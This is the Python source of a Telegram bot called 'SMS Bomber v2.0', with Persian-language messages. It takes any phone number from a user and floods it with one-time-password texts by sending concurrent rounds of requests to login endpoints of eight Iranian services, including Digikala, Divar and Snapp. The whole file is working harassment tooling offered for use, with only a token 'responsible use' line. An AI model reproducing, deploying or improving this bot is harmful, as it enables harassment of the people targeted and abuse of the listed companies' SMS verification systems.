import os
import telebot
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import re
from flask import Flask

# تنظیمات
BOT_TOKEN = os.environ.get("BOT_TOKEN")
MAX_THREADS = 20
TIMEOUT = 10
DELAY_BETWEEN_ROUNDS = 2

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# سرویس‌های SMS
SMS_SERVICES = [
    {
        "name": "دیجی‌کالا",
        "url": "https://api.digikala.com/v1/user/authenticate/",
        "method": "POST",
        "data": {"username": ""},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "دیوار",
        "url": "https://api.divar.ir/v5/auth/authenticate",
        "method": "POST", 
        "data": {"phone": ""},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "بانی‌مود",
        "url": "https://mobapi.banimode.com/api/v2/auth/request",
        "method": "POST",
        "data": {"phone": ""},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "اسنپ",
        "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        "method": "POST",
        "data": {"cellphone": ""},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "تپسی",
        "url": "https://api.tapsi.cab/api/v2/user",
        "method": "POST",
        "data": {"phone": ""},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "آپ",
        "url": "https://api.alopeyk.com/api/v2/user/login",
        "method": "POST",
        "data": {"username": ""},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "ریحون",
        "url": "https://api.reyhoon.com/v2/user/register/check-mobile",
        "method": "POST",
        "data": {"mobile": ""},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "اسنپ‌فود",
        "url": "https://snappfood.ir/auth/login",
        "method": "POST",
        "data": {"cellphone": ""},
        "headers": {"Content-Type": "application/json"}
    }
]

# دیکشنری برای ذخیره وضعیت کاربران
user_sessions = {}
session_lock = threading.Lock()

class SMSBomber:
    def __init__(self, phone_number, rounds=1, max_threads=MAX_THREADS):
        self.phone = phone_number
        self.rounds = rounds
        self.max_threads = max_threads
        self.success_count = 0
        self.failed_count = 0
        self.total_requests = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.results = []
        
    def send_sms(self, service):
        """ارسال SMS به یک سرویس"""
        try:
            data = service["data"].copy()
            
            # جایگزینی شماره تلفن
            for key in data:
                if data[key] == "":
                    data[key] = self.phone
            
            if service["method"].upper() == "POST":
                response = requests.post(
                    service["url"],
                    json=data,
                    headers=service.get("headers", {}),
                    timeout=TIMEOUT
                )
            else:
                response = requests.get(
                    service["url"],
                    params=data,
                    headers=service.get("headers", {}),
                    timeout=TIMEOUT
                )
            
            if response.status_code in [200, 201, 202, 204]:
                with self.lock:
                    self.success_count += 1
                return True, service["name"], response.status_code
            else:
                with self.lock:
                    self.failed_count += 1
                return False, service["name"], response.status_code
                
        except Exception as e:
            with self.lock:
                self.failed_count += 1
            return False, service["name"], str(e)
    
    def bomb_round(self, round_num):
        """انجام یک دور بمباران"""
        round_results = []
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {
                executor.submit(self.send_sms, service): service["name"] 
                for service in SMS_SERVICES
            }
            
            for future in as_completed(futures):
                success, service_name, status = future.result()
                self.total_requests += 1
                
                result_msg = f"{'✅' if success else '❌'} {service_name} - {'موفق' if success else 'خطا'}: {status}"
                round_results.append(result_msg)
                
        return round_results
    
    def start_bombing(self):
        """شروع عملیات بمباران"""
        all_results = []
        
        for round_num in range(1, self.rounds + 1):
            round_results = self.bomb_round(round_num)
            all_results.extend(round_results)
            
            if round_num < self.rounds:
                time.sleep(DELAY_BETWEEN_ROUNDS)
        
        return all_results

def validate_phone(phone):
    """اعتبارسنجی شماره تلفن"""
    phone = ''.join(filter(str.isdigit, phone))
    
    if len(phone) == 10 and phone.startswith('9'):
        return '0' + phone
    elif len(phone) == 11 and phone.startswith('09'):
        return phone
    return None

# دستورات ربات
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = """
💣 SMS Bomber v2.0

📋 دستورات:
/bomb - شروع بمباران
/stats - آمار سرویس‌ها
/help - راهنما

⚠️ استفاده مسئولانه
    """
    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = f"""
📖 راهنمای استفاده:

1. برای شروع:
   /bomb

2. تعداد سرویس‌ها: {len(SMS_SERVICES)}
   
3. تنظیمات:
   - حداکثر ترد: {MAX_THREADS}
   - تایم‌اوت: {TIMEOUT} ثانیه
   - تاخیر بین دورها: {DELAY_BETWEEN_ROUNDS} ثانیه
    """
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['stats'])
def show_stats(message):
    stats_text = f"""
📊 آمار ربات:

• سرویس‌های فعال: {len(SMS_SERVICES)}
• کاربران آنلاین: {len(user_sessions)}
• وضعیت: فعال ✅
• محیط: Railway 🚄
    """
    bot.send_message(message.chat.id, stats_text)

@bot.message_handler(commands=['bomb'])
def start_bomb_process(message):
    chat_id = message.chat.id
    
    with session_lock:
        user_sessions[chat_id] = {"step": "waiting_phone"}
    
    bot.send_message(
        chat_id,
        "📱 شماره موبایل را وارد کنید:\n\n"
        "مثال: 09123456789\n\n"
        "❌ برای لغو: /cancel"
    )

@bot.message_handler(commands=['cancel'])
def cancel_operation(message):
    chat_id = message.chat.id
    with session_lock:
        if chat_id in user_sessions:
            del user_sessions[chat_id]
    bot.send_message(chat_id, "❌ عملیات لغو شد.")

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    chat_id = message.chat.id
    
    with session_lock:
        if chat_id not in user_sessions:
            return
        user_data = user_sessions[chat_id]
    
    if user_data.get("step") == "waiting_phone":
        phone = message.text.strip()
        validated_phone = validate_phone(phone)
        
        if not validated_phone:
            bot.send_message(
                chat_id,
                "❌ شماره نامعتبر!\nلطفا دوباره وارد کنید:\nمثال: 09123456789"
            )
            return
        
        user_data["step"] = "waiting_rounds"
        user_data["phone"] = validated_phone
        
        bot.send_message(
            chat_id,
            "🔁 تعداد دورهای ارسال (1-3):\n\n"
            "مثال: 1\n\n"
            "❌ برای لغو: /cancel"
        )
    
    elif user_data.get("step") == "waiting_rounds":
        try:
            rounds = int(message.text.strip())
            if rounds < 1 or rounds > 3:
                bot.send_message(
                    chat_id,
                    "❌ تعداد دور باید بین 1-3 باشد!"
                )
                return
            
            # شروع عملیات
            phone = user_data["phone"]
            
            progress_msg = bot.send_message(
                chat_id,
                f"🚀 شروع بمباران...\n\n"
                f"📞 شماره: {phone}\n"
                f"🔁 دورها: {rounds}\n"
                f"📡 سرویس‌ها: {len(SMS_SERVICES)}\n\n"
                f"⏳ لطفا صبر کنید..."
            )
            
            def execute_bomb():
                try:
                    bomber = SMSBomber(phone, rounds)
                    results = bomber.start_bombing()
                    
                    # نمایش نتایج
                    result_text = f"📊 نتایج بمباران برای {phone}:\n\n"
                    
                    # نمایش 10 نتیجه اول
                    for result in results[:10]:
                        result_text += f"{result}\n"
                    
                    if len(results) > 10:
                        result_text += f"\n... و {len(results) - 10} نتیجه دیگر\n"
                    
                    result_text += f"\n📈 جمع‌بندی:\n"
                    result_text += f"✅ موفق: {bomber.success_count}\n"
                    result_text += f"❌ ناموفق: {bomber.failed_count}\n"
                    result_text += f"📊 مجموع: {bomber.total_requests}\n"
                    result_text += f"⏱️ زمان: {time.time() - bomber.start_time:.1f}ثانیه"
                    
                    bot.edit_message_text(
                        result_text,
                        chat_id=chat_id,
                        message_id=progress_msg.message_id
                    )
                    
                except Exception as e:
                    bot.edit_message_text(
                        f"❌ خطا: {str(e)}",
                        chat_id=chat_id,
                        message_id=progress_msg.message_id
                    )
                finally:
                    with session_lock:
                        if chat_id in user_sessions:
                            del user_sessions[chat_id]
            
            thread = threading.Thread(target=execute_bomb)
            thread.daemon = True
            thread.start()
            
        except ValueError:
            bot.send_message(chat_id, "❌ لطفا عدد وارد کنید!")

# Routes برای Railway
@app.route('/')
def home():
    return "💣 SMS Bomber Bot is Running!"

@app.route('/health')
def health():
    return {
        "status": "healthy", 
        "services": len(SMS_SERVICES),
        "active_users": len(user_sessions)
    }

def run_flask():
    app.run(host='0.0.0.0', port=os.environ.get('PORT', 5000))

# راه‌اندازی
if __name__ == "__main__":
    print("💣 SMS Bomber Bot Started!")
    print(f"📡 Services: {len(SMS_SERVICES)}")
    
    # اجرای Flask در thread جداگانه
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # اجرای ربات
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"❌ Bot Error: {e}")
